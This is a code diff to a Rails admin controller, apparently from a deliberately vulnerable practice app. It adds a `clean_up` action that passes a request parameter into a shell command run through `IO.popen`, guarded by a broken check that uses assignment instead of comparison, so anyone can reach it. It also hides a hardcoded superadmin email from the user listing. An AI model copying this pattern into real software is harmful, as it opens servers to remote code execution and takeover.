@@ -6,7 +6,11 @@ class AdminController < ApplicationController
     user_h = {}
     users.each do |user|
       role = user.admin? ? "Admin" : "User"
-      user_h[user.email] = role
+      if user.email != "superadmin@koala_meat.com"
+        user_h[user.email] = role
+      else
+        user_h["xxxxxxxxxx@koala_meat.com"] = "Super Admin (real email should not shown for security reasons)"
+      end 
     end
      sorted = user_h.sort_by{|k,v| v}
      return sorted
@@ -17,7 +21,7 @@ class AdminController < ApplicationController
   end
   
   def maint
-    check("maint")
+    super_check("maint")
   end
   
   def mgmt
@@ -32,6 +36,22 @@ class AdminController < ApplicationController
    end
   end
   
+  def clean_up
+    return if current_user && !current_user.admin? && !current_user.email = "superadmin@koala_meat.com"
+    syscmd = "ruby #{Rails.root}/#{params[:file]}"
+    syscmd_exec(syscmd)
+  end
+  
+  def syscmd_exec(syscmd)
+    str = '' 
+    io = ::IO.popen(syscmd, "r")
+    io.each do |line|
+      str << "#{line}"
+    end
+    flash[:notice] = str
+    redirect_to maint_url   
+  end
+
   private
   
   def check(render_url)
@@ -41,5 +61,15 @@ class AdminController < ApplicationController
       destroy
     end
   end
+  
+  def super_check(render_url)
+    if current_user && current_user.admin? && current_user.email == "superadmin@koala_meat.com"
+      render "#{render_url}"
+    else
+      redirect_to admin_url
+      flash[:notice] = "You are NOT authorized to use that function!"
+    end
+  end
+  
   
 end
